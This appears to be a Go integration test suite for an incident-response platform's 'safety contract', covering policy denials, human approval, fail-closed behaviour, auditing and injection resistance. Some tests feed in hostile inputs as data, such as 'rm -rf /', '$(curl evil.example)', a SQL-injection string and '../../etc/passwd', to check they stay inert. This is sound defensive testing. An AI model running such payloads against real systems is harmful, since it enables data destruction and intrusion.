package integration_test

import (
	"context"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/kamilxgriefer/griefer-security-platform/internal/api"
	"github.com/kamilxgriefer/griefer-security-platform/internal/audit"
	"github.com/kamilxgriefer/griefer-security-platform/internal/httpx"
	"github.com/kamilxgriefer/griefer-security-platform/internal/incidents"
	"github.com/kamilxgriefer/griefer-security-platform/internal/policy"
	"github.com/kamilxgriefer/griefer-security-platform/internal/storage"
)

// The cases below are GRIEFER's safety contract. Each one states a property the
// platform must hold, phrased as the failure it prevents. They are grouped
// under one parent test so a reviewer can run `go test -run TestSafetyContract`
// and read the whole guarantee in one output.

// Case 1 — a single weak signal must never trigger automated containment.
func TestSafetyContract_SingleWeakSignalDoesNotIsolate(t *testing.T) {
	s := newStack(t, stackOptions{})

	resp, raw := s.post("/api/v1/events", eventAt("user_signin", "authentication", "medium", "u-5001",
		`"network":{"source_ip":"203.0.113.50","first_seen_for_actor":true}`))
	if resp.StatusCode != http.StatusAccepted {
		t.Fatalf("status = %d", resp.StatusCode)
	}
	var result api.IngestResult
	s.decode(raw, &result)
	if result.IncidentID == "" {
		t.Fatal("the sign-in produced no incident to act on")
	}

	inc, err := s.store.GetIncident(context.Background(), result.IncidentID)
	if err != nil {
		t.Fatalf("GetIncident() error = %v", err)
	}
	if len(inc.EvidenceCategories()) != 1 {
		t.Fatalf("EvidenceCategories = %v, want exactly one weak signal", inc.EvidenceCategories())
	}

	_, action, body := s.evaluate(inc.ID, "isolate_endpoint", "simulate", true)
	if action == nil {
		t.Fatalf("evaluate failed: %s", body)
	}
	if action.Status == incidents.ActionSimulated {
		t.Fatal("a single suspicious sign-in authorised automated isolation")
	}
	if action.Status != incidents.ActionRequiresApproval {
		t.Fatalf("Status = %q, want requires_approval", action.Status)
	}
	reasons := strings.Join(action.PolicyDecision.Reasons, " | ")
	// Both, not either.
	//
	// docs/SAFETY_MODEL.md cites this test for the isolation-class rule, and
	// with "or" it did not guard it: the general corroboration rule produces
	// "independent evidence categories" on its own, so this passed with the
	// isolation rule deleted. A citation that survives the deletion of the thing
	// it is cited for is a claim about a guard that is not there — which is the
	// exact defect the isolation rule itself turned out to be.
	if !strings.Contains(reasons, "independent evidence categories") {
		t.Errorf("reasons = %q, want the corroboration rule's explanation", reasons)
	}
	if !strings.Contains(reasons, "Isolation-class action") {
		t.Errorf("reasons = %q, want the isolation rule to name the action class. "+
			"Without this assertion, deleting that rule leaves this test green.", reasons)
	}
}

// Case 2 — sign-in plus privilege change plus secret access is a high-risk
// incident, and only then may containment proceed without a human.
func TestSafetyContract_CorroboratedChainProducesHighRisk(t *testing.T) {
	s := newStack(t, stackOptions{})
	inc := s.replayScenario()

	if inc.RiskScore < 70 {
		t.Errorf("RiskScore = %d, want at least 70", inc.RiskScore)
	}
	if inc.Severity != "critical" {
		t.Errorf("Severity = %q, want critical", inc.Severity)
	}
	if len(inc.EvidenceCategories()) < 3 {
		t.Fatalf("EvidenceCategories = %v, want at least three independent categories", inc.EvidenceCategories())
	}

	_, action, body := s.evaluate(inc.ID, "isolate_endpoint", "simulate", true)
	if action == nil {
		t.Fatalf("evaluate failed: %s", body)
	}
	if action.Status != incidents.ActionSimulated {
		t.Fatalf("Status = %q, want simulated once the chain is corroborated (reasons: %v)",
			action.Status, action.PolicyDecision.Reasons)
	}
}

// Case 3 — a destructive action is refused, in every mode, however it is asked.
func TestSafetyContract_DestructiveActionsAreAlwaysDenied(t *testing.T) {
	s := newStack(t, stackOptions{})
	inc := s.replayScenario()

	for _, actionType := range []string{"delete_identity", "wipe_endpoint", "purge_audit_records"} {
		for _, mode := range []string{"simulate", "execute"} {
			for _, automated := range []bool{true, false} {
				name := actionType + "/" + mode
				if !automated {
					name += "/human"
				}
				t.Run(name, func(t *testing.T) {
					_, action, body := s.evaluate(inc.ID, actionType, mode, automated)
					if action == nil {
						t.Fatalf("evaluate failed: %s", body)
					}
					if action.Status != incidents.ActionDenied {
						t.Fatalf("Status = %q, want denied", action.Status)
					}
					if action.PolicyDecision.Allow {
						t.Fatal("the decision permitted a destructive action")
					}
					if action.Simulated != nil {
						t.Error("a denied action produced an effect")
					}
					if !strings.Contains(strings.Join(action.PolicyDecision.Reasons, " "), "destructive") {
						t.Errorf("reasons = %v, want them to name the destructive classification", action.PolicyDecision.Reasons)
					}
				})
			}
		}
	}
}

// Case 4 — an action that cannot be undone requires an explicit human decision.
func TestSafetyContract_IrreversibleActionsRequireHumanApproval(t *testing.T) {
	s := newStack(t, stackOptions{})
	inc := s.replayScenario()

	for _, actionType := range []string{"revoke_sessions", "rotate_exposed_secret"} {
		t.Run(actionType, func(t *testing.T) {
			spec, err := incidents.Lookup(actionType)
			if err != nil {
				t.Fatalf("Lookup() error = %v", err)
			}
			if spec.Reversible {
				t.Skipf("%s is reversible in the catalog; this case does not apply", actionType)
			}

			_, action, body := s.evaluate(inc.ID, actionType, "simulate", true)
			if action == nil {
				t.Fatalf("evaluate failed: %s", body)
			}
			if action.Status != incidents.ActionRequiresApproval {
				t.Fatalf("Status = %q, want requires_approval", action.Status)
			}
			if action.Simulated != nil {
				t.Error("an action awaiting approval produced an effect")
			}
			if !strings.Contains(strings.Join(action.PolicyDecision.Reasons, " "), "not reversible") {
				t.Errorf("reasons = %v, want them to cite irreversibility", action.PolicyDecision.Reasons)
			}
		})
	}
}

// Case 4b — an action touching a critical asset requires human approval.
func TestSafetyContract_CriticalAssetActionsRequireHumanApproval(t *testing.T) {
	s := newStack(t, stackOptions{})
	inc := s.replayScenario()

	_, action, body := s.evaluate(inc.ID, "rotate_exposed_secret", "simulate", true)
	if action == nil {
		t.Fatalf("evaluate failed: %s", body)
	}
	if action.Status != incidents.ActionRequiresApproval {
		t.Fatalf("Status = %q, want requires_approval", action.Status)
	}
	if !strings.Contains(strings.Join(action.PolicyDecision.Reasons, " "), "classified critical") {
		t.Errorf("reasons = %v, want them to cite the critical asset", action.PolicyDecision.Reasons)
	}
}

// Case 5 — an unreachable Policy Kernel blocks every action.
func TestSafetyContract_UnreachablePolicyKernelBlocksAllActions(t *testing.T) {
	s := newStack(t, stackOptions{kernel: unreachableKernel{}})

	resp, raw := s.post("/api/v1/events", eventAt("user_signin", "authentication", "medium", "u-1042",
		`"network":{"source_ip":"203.0.113.77","first_seen_for_actor":true}`))
	if resp.StatusCode != http.StatusAccepted {
		t.Fatalf("ingest status = %d", resp.StatusCode)
	}
	var result api.IngestResult
	s.decode(raw, &result)

	// Even the safest, most obviously fine action is refused.
	_, action, body := s.evaluate(result.IncidentID, "preserve_evidence", "simulate", false)
	if action == nil {
		t.Fatalf("evaluate failed: %s", body)
	}
	if action.Status != incidents.ActionDenied {
		t.Fatalf("Status = %q, want denied; an unreachable kernel must never mean 'probably fine'", action.Status)
	}
	if !action.PolicyDecision.FailClosed {
		t.Error("FailClosed is not set on the decision")
	}
	if action.PolicyDecision.Engine != policy.EngineUnavailable {
		t.Errorf("Engine = %q, want %q", action.PolicyDecision.Engine, policy.EngineUnavailable)
	}
}

// Case 6 — an event that fails validation never reaches the correlation engine.
func TestSafetyContract_InvalidEventsNeverReachCorrelation(t *testing.T) {
	s := newStack(t, stackOptions{})

	invalid := []string{
		`{"schema_version":"0.1"}`,
		`{"schema_version":"0.1","timestamp":"not-a-time","source_type":"identity_provider","source_name":"x","event_type":"user_signin","category":"authentication","severity":"low"}`,
		`{"schema_version":"0.1","timestamp":"2026-08-23T09:00:00Z","source_type":"telepathy","source_name":"x","event_type":"user_signin","category":"authentication","severity":"low"}`,
		`{"schema_version":"0.1","timestamp":"2026-08-23T09:00:00Z","source_type":"identity_provider","source_name":"x","event_type":"user_signin","category":"authentication","severity":"low","exec":"whoami"}`,
	}
	for i, body := range invalid {
		resp, raw := s.post("/api/v1/events", body)
		if resp.StatusCode != http.StatusBadRequest {
			t.Errorf("event %d: status = %d, want 400 (body: %s)", i, resp.StatusCode, raw)
		}
	}

	ctx := context.Background()
	if _, total, err := s.store.ListEvents(ctx, 10, 0); err != nil || total != 0 {
		t.Errorf("stored %d events (err %v), want 0", total, err)
	}
	if _, total, err := s.store.ListIncidents(ctx, storage.IncidentFilter{}); err != nil || total != 0 {
		t.Errorf("created %d incidents (err %v), want 0", total, err)
	}

	// The rejection is itself recorded.
	rejected := 0
	for _, e := range s.auditEntries() {
		if e.Action == audit.ActionEventRejected {
			rejected++
		}
	}
	if rejected != len(invalid) {
		t.Errorf("audit recorded %d rejections, want %d", rejected, len(invalid))
	}
}

// Case 7 — an oversized payload is refused before it is parsed.
func TestSafetyContract_OversizedPayloadsAreRejected(t *testing.T) {
	s := newStack(t, stackOptions{maxRequestSize: 4096, maxBatchEvents: 5})

	t.Run("single event", func(t *testing.T) {
		body := `{"schema_version":"0.1","source_name":"` + strings.Repeat("A", 16384) + `"}`
		resp, raw := s.post("/api/v1/events", body)
		if resp.StatusCode != http.StatusRequestEntityTooLarge {
			t.Fatalf("status = %d, want 413", resp.StatusCode)
		}
		var errBody httpx.ErrorResponse
		s.decode(raw, &errBody)
		if errBody.Error.Code != httpx.CodePayloadTooLarge {
			t.Errorf("code = %q", errBody.Error.Code)
		}
	})

	t.Run("batch with too many events", func(t *testing.T) {
		var parts []string
		for i := 0; i < 20; i++ {
			parts = append(parts, eventAt("user_signin", "authentication", "low", "u-batch", ""))
		}
		resp, _ := s.post("/api/v1/events/batch", `{"events":[`+strings.Join(parts, ",")+`]}`)
		if resp.StatusCode != http.StatusRequestEntityTooLarge {
			t.Errorf("status = %d, want 413", resp.StatusCode)
		}
	})

	if _, total, _ := s.store.ListEvents(context.Background(), 10, 0); total != 0 {
		t.Errorf("stored %d events from rejected payloads, want 0", total)
	}
}

// Case 8 — telemetry cannot carry an executive instruction into the platform.
func TestSafetyContract_TelemetryCannotInjectCommands(t *testing.T) {
	s := newStack(t, stackOptions{})

	t.Run("control-plane label keys are quarantined", func(t *testing.T) {
		body := eventAt("user_signin", "authentication", "medium", "u-1042",
			`"network":{"source_ip":"203.0.113.77","first_seen_for_actor":true},`+
				`"labels":{"action":"isolate_endpoint","command":"rm -rf /","griefer_policy":"allow","policy_override":"true","outcome":"success"}`)
		resp, raw := s.post("/api/v1/events", body)
		if resp.StatusCode != http.StatusAccepted {
			t.Fatalf("status = %d, body = %s", resp.StatusCode, raw)
		}
		var result api.IngestResult
		s.decode(raw, &result)

		if len(result.Quarantined) != 4 {
			t.Fatalf("Quarantined = %v, want all four control-plane keys stripped", result.Quarantined)
		}

		stored, _, err := s.store.ListEvents(context.Background(), 10, 0)
		if err != nil {
			t.Fatalf("ListEvents() error = %v", err)
		}
		for _, key := range []string{"action", "command", "griefer_policy", "policy_override"} {
			if _, present := stored[0].Labels[key]; present {
				t.Errorf("label %q reached storage", key)
			}
		}
		if stored[0].Labels["outcome"] != "success" {
			t.Error("a benign label was stripped along with the hostile ones")
		}

		// The attempt is itself a signal and must be recorded.
		found := false
		for _, e := range s.auditEntries() {
			if e.Action == audit.ActionEventQuarantined {
				found = true
			}
		}
		if !found {
			t.Error("no audit entry recorded the injection attempt")
		}
	})

	t.Run("no action is taken as a result", func(t *testing.T) {
		_, total, err := s.store.ListActions(context.Background(), "", 50, 0)
		if err != nil {
			t.Fatalf("ListActions() error = %v", err)
		}
		if total != 0 {
			t.Fatalf("%d response actions exist after an injection attempt, want 0", total)
		}
	})

	t.Run("unknown top-level fields are rejected outright", func(t *testing.T) {
		body := `{"schema_version":"0.1","timestamp":"` + time.Now().UTC().Format(time.RFC3339) +
			`","source_type":"identity_provider","source_name":"hostile","event_type":"user_signin",` +
			`"category":"authentication","severity":"low","response_action":{"type":"wipe_endpoint","mode":"execute"}}`
		resp, _ := s.post("/api/v1/events", body)
		if resp.StatusCode != http.StatusBadRequest {
			t.Errorf("status = %d, want 400", resp.StatusCode)
		}
	})

	t.Run("SQL-shaped and shell-shaped strings are data, not code", func(t *testing.T) {
		body := eventAt("user_signin", "authentication", "low", "u'; DROP TABLE incidents; --",
			`"labels":{"note":"$(curl evil.example)","other":"1 OR 1=1"}`)
		resp, raw := s.post("/api/v1/events", body)
		if resp.StatusCode != http.StatusAccepted {
			t.Fatalf("status = %d, body = %s", resp.StatusCode, raw)
		}
		// The store must still be intact and the value stored verbatim.
		stored, total, err := s.store.ListEvents(context.Background(), 10, 0)
		if err != nil {
			t.Fatalf("ListEvents() error = %v", err)
		}
		if total == 0 {
			t.Fatal("the event was not stored")
		}
		if stored[0].Actor.ID != "u'; DROP TABLE incidents; --" {
			t.Errorf("Actor.ID = %q; the value must round-trip as inert data", stored[0].Actor.ID)
		}
	})
}

// Case 9 — an action outside the catalog is refused.
func TestSafetyContract_UnknownActionTypesAreRejected(t *testing.T) {
	s := newStack(t, stackOptions{})
	inc := s.replayScenario()

	for _, actionType := range []string{"launch_missiles", "", "PRESERVE_EVIDENCE", "../../etc/passwd"} {
		t.Run(actionType, func(t *testing.T) {
			resp, _, raw := s.evaluate(inc.ID, actionType, "simulate", false)
			if resp.StatusCode != http.StatusBadRequest {
				t.Fatalf("status = %d, want 400 (body: %s)", resp.StatusCode, raw)
			}
			var errBody httpx.ErrorResponse
			s.decode(raw, &errBody)
			if errBody.Error.Code != httpx.CodeValidationFailed {
				t.Errorf("code = %q", errBody.Error.Code)
			}
		})
	}

	// A rejected action is still recorded: attempts to invoke actions that do
	// not exist are worth seeing.
	rejected := 0
	for _, e := range s.auditEntries() {
		if e.Action == audit.ActionActionRejected {
			rejected++
		}
	}
	if rejected == 0 {
		t.Error("no audit entry recorded the rejected action requests")
	}
}

// Case 10 — every Policy Kernel decision leaves an audit entry.
func TestSafetyContract_EveryPolicyDecisionIsAudited(t *testing.T) {
	s := newStack(t, stackOptions{})
	inc := s.replayScenario()

	// One action from each outcome class.
	cases := []struct {
		actionType string
		mode       string
	}{
		{"preserve_evidence", "simulate"},     // allow
		{"revoke_sessions", "simulate"},       // require_approval
		{"rotate_exposed_secret", "simulate"}, // require_approval (critical asset)
		{"wipe_endpoint", "simulate"},         // deny
		{"require_mfa", "execute"},            // require_approval (execute mode)
	}

	actionIDs := make([]string, 0, len(cases))
	for _, c := range cases {
		_, action, body := s.evaluate(inc.ID, c.actionType, c.mode, true)
		if action == nil {
			t.Fatalf("%s: evaluate failed: %s", c.actionType, body)
		}
		actionIDs = append(actionIDs, action.ID)
	}

	entries := s.auditEntries()
	for i, id := range actionIDs {
		found := false
		for _, e := range entries {
			if e.Action == audit.ActionPolicyEvaluated && e.SubjectID == id {
				found = true
				if e.Reason == "" {
					t.Errorf("%s: audit entry has no reason", cases[i].actionType)
				}
				if e.Details["effect"] == nil || e.Details["policy_version"] == nil {
					t.Errorf("%s: audit entry does not record the effect and policy version", cases[i].actionType)
				}
				if e.Timestamp.IsZero() || e.Sequence == 0 {
					t.Errorf("%s: audit entry is not properly stamped", cases[i].actionType)
				}
			}
		}
		if !found {
			t.Errorf("%s: no policy.evaluated audit entry for action %s", cases[i].actionType, id)
		}
	}

	// The trail must also be readable through the API, or it is not usable
	// evidence.
	resp, body := s.get("/api/v1/audit?limit=200")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("audit endpoint status = %d", resp.StatusCode)
	}
	var page httpx.Page[*audit.Entry]
	s.decode(body, &page)
	if page.Total < len(cases) {
		t.Errorf("audit endpoint reports %d entries, want at least %d", page.Total, len(cases))
	}
}

// The response engine must never claim to have executed anything in v0.1.
func TestSafetyContract_NothingIsEverExecuted(t *testing.T) {
	s := newStack(t, stackOptions{})
	inc := s.replayScenario()

	for _, actionType := range incidents.KnownActionTypes() {
		for _, mode := range []string{"simulate", "execute"} {
			_, action, body := s.evaluate(inc.ID, actionType, mode, true)
			if action == nil {
				t.Fatalf("%s/%s: evaluate failed: %s", actionType, mode, body)
			}
			if action.ExecutedAt != nil {
				t.Errorf("%s/%s: ExecutedAt is set; v0.1 ships no actuator", actionType, mode)
			}
			if mode == "execute" && action.Status == incidents.ActionSimulated {
				t.Errorf("%s: an execute request was reported as carried out", actionType)
			}
		}
	}
}
